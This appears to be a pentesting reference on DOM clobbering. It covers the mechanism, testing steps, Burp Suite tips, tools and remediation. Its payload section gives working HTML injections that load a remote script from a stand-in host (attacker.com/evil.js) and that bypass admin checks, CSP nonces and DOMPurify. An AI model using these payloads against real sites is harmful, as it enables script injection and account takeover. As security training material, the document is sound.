# DOM Clobbering

## Overview
DOM Clobbering is a technique where an attacker injects HTML elements (typically `<a>`, `<form>`, `<img>`, or `<input>` tags with specific `id` or `name` attributes) that overwrite or "clobber" JavaScript global variables or properties on `document` or `window`. It exists because browsers have a legacy behavior where HTML elements with matching IDs are accessible as properties of `window` and `document`. Attackers exploit this to manipulate application logic that relies on globals, to inject URLs used in script `src` or `href` attributes, and to bypass security checks — often escalating to XSS in applications that have already blocked direct script injection.

## How It Works
Browsers expose named HTML elements as global properties:
```html
<a id="config">...</a>
<script>
  console.log(window.config); // the <a> element, not the intended config object
  console.log(window.config.url); // undefined, OR can be set via href
</script>
```

Using the `name` attribute on `<form>` or nested elements, attackers can clobber properties two levels deep:
```html
<form id="config" name="url"><input name="href" value="https://attacker.com/evil.js"></form>
<!-- window.config.url.href === "https://attacker.com/evil.js" -->
```

If application code does `var url = window.config && window.config.url;` and then passes `url` to a `<script src>`, `fetch()`, or `location`, the attacker controls that value.

## Impact
- Bypassing security checks that rely on global variables being undefined or null
- Injecting attacker-controlled URLs into script `src`, `fetch()`, `XMLHttpRequest`, or `location`
- Achieving XSS when no direct script injection is possible (often bypasses HTML sanitizers like DOMPurify)
- Overriding configuration objects that control application behavior (debug mode, feature flags)
- Bypassing CSP nonce checks if nonce values are read from DOM globals
- Manipulating error handlers, logging callbacks, or analytics endpoints
- Exploiting HTML sanitizers that allow `<a>` and `<form>` tags but block `<script>`

## Where to Look
- Code that reads properties from `window.X`, `document.X`, or undefined globals without type checking
- Patterns like `if (window.config) { load(window.config.url); }`
- JavaScript that dereferences globals set by inline scripts that may execute after attacker-controlled HTML is parsed
- DOM-based sinks that use variables sourced from `window` or `document` properties
- Applications using DOMPurify that allow `id` and `name` attributes on anchor, form, or image tags
- Single-page apps that pass DOM element references around as configuration

## Testing Steps
1. Identify application JavaScript that reads from `window` or `document` properties.
2. Find injection points where HTML (but not scripts) can be inserted — e.g., innerHTML sinks, comment sections, profile bios.
3. Inject an anchor tag with an ID matching a targeted global:
   ```html
   <a id="config">test</a>
   ```
4. Open the browser console and verify the global is now clobbered: `window.config` returns the `<a>` element.
5. To set the `.href` property, use the `href` attribute of the anchor:
   ```html
   <a id="config" href="https://attacker.com/evil.js">x</a>
   ```
6. For two-level clobbering (`window.obj.prop`), use form + input:
   ```html
   <form id="obj"><input name="prop" value="injected"></form>
   ```
7. For `toString()` tricks, note that an `<a>` element's `toString()` returns its `href`:
   ```html
   <a id="scriptSrc" href="https://attacker.com/evil.js">x</a>
   <!-- If code does: script.src = window.scriptSrc; -->
   <!-- String coercion calls .toString() which returns the href -->
   ```
8. Test if the application checks `typeof` before using the variable — if so, elements may still pass `typeof obj === 'object'`.
9. Chain with a script loading sink: inject clobbering payload + find code that does `createElement('script'); script.src = global; document.head.appendChild(script)`.
10. Test HTMLCollection clobbering for arrays of elements with the same name.

## Payloads / Techniques

Basic global clobbering with `<a>`:
```html
<a id="x">clobber</a>
<!-- window.x is now the <a> element -->
```

Clobbering a URL-type global (href coercion):
```html
<a id="scriptUrl" href="https://attacker.com/evil.js">x</a>
<!-- If code: document.createElement('script').src = window.scriptUrl -->
<!-- The <a>.toString() returns href value -->
```

Two-level clobbering with `<form>` and `<input>`:
```html
<form id="config"><input name="cdnUrl" value="https://attacker.com/evil.js"></form>
<!-- window.config.cdnUrl === HTMLInputElement (value: "https://attacker.com/evil.js") -->
<!-- If the code does: src = window.config.cdnUrl.value -- attacker controls src -->
```

Two-level with `<form name>`:
```html
<form name="config"><input name="baseUrl" value="https://attacker.com"></form>
<!-- document.config.baseUrl.value === "https://attacker.com" -->
```

Clobbering `document.cookie` (legacy):
```html
<!-- In older browsers, form named "cookie" could affect document.cookie -->
<form name="cookie"><input name="sessionid" value="attacker"></form>
```

Clobbering `window.name`:
```html
<!-- window.name is not clobberable via id/name, but can be set cross-origin: -->
<script>
// Attacker page sets window.name before redirecting to target:
window.name = 'javascript:alert(1)';
location = 'https://target.com/page-that-uses-window.name';
</script>
```

Clobbering `document.getElementById` result:
```html
<!-- If code does: var cfg = document.getElementById('appConfig'); cfg.apiUrl -->
<div id="appConfig" data-apiUrl="https://attacker.com">...</div>
<!-- Injects via data attribute if code reads getAttribute -->
```

Overriding HTMLElement properties via namespace collision:
```html
<img id="isAdmin" src="x" onerror="">
<!-- window.isAdmin is truthy (it's an HTMLImageElement) -->
<!-- Bypasses: if (window.isAdmin) { grantAdminAccess(); } -->
```

Clobbering nonces (if nonce is read from DOM):
```html
<a id="cspNonce" href="fakeNonce123">x</a>
<!-- If code does: script.nonce = window.cspNonce; or reads nonce from window -->
```

Chained DOM clobbering to XSS:
```html
<!-- Step 1: Inject HTML (no script allowed) -->
<form id="config"><input name="src" value="https://attacker.com/payload.js"></form>

<!-- Step 2: Existing vulnerable code: -->
<script>
  var cfg = window.config || {};
  var s = document.createElement('script');
  s.src = cfg.src;  // reads clobbered value
  document.body.appendChild(s);
</script>
```

DOMPurify bypass via clobbering (affects versions that allow id/name):
```html
<!-- DOMPurify allows <a> and <form> but blocks <script> -->
<a id="DOMPurify" name="removed" href="cid:alert(1)">test</a>
<!-- Clobbers window.DOMPurify, breaking the sanitizer itself -->
```

## Burp Suite Tips
- Use **DOM Invader** in Burp's browser — it has a dedicated DOM Clobbering detector that identifies clobberable globals and potential sinks.
- In **Repeater**, submit HTML injection payloads and use the **Render** tab to check if elements are reflected in the DOM with their `id`/`name` attributes.
- Search the JavaScript source (via **Proxy > HTTP History** with content type filter for JavaScript) for patterns like `window.X`, `document.X`, global reads without `typeof` guards.
- Use **Logger++** to record all navigations triggered by clobbering attacks that cause URL loads.
- The **Turbo Intruder** extension can quickly try many `id` values against injection points to find which ones collide with real application globals.

## Tools
- Burp Suite DOM Invader — automated DOM clobbering detection
- DOMClob (browser extension) — maps all window properties to find clobberable globals
- Chrome DevTools Console — manual testing of `window.<id>` after injection
- Semgrep — static rules to detect unsafe global reads in JavaScript source
- ESLint `no-implicit-globals` rule — prevents accidental global variable reads

## Remediation
- Never rely on global variables being undefined when they might be set by DOM elements — always use `typeof` checks and explicit initialization.
- Use strict mode (`'use strict'`) which prevents accidental global variable creation.
- Use the `let`/`const` keywords in module scope — module-scoped variables shadow DOM globals.
- Sanitize user-supplied HTML with DOMPurify configured to strip `id` and `name` attributes unless strictly necessary.
- Prefer accessing DOM elements via `document.querySelector()` with precise selectors rather than relying on global shortcuts.
- Use `Object.prototype.hasOwnProperty()` before trusting inherited properties.
- Employ `document.getElementById()` with null checks rather than assuming a global variable corresponds to a DOM element.
- Consider using `window.hasOwnProperty()` to distinguish between developer-defined globals and DOM-clobbered ones.

## References
https://portswigger.net/web-security/dom-based/dom-clobbering
https://portswigger.net/research/dom-clobbering-strikes-back
https://github.com/nicowillis/dom-clobbering
https://owasp.org/www-community/attacks/DOM_Based_XSS
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering
https://developer.mozilla.org/en-US/docs/Web/API/Window
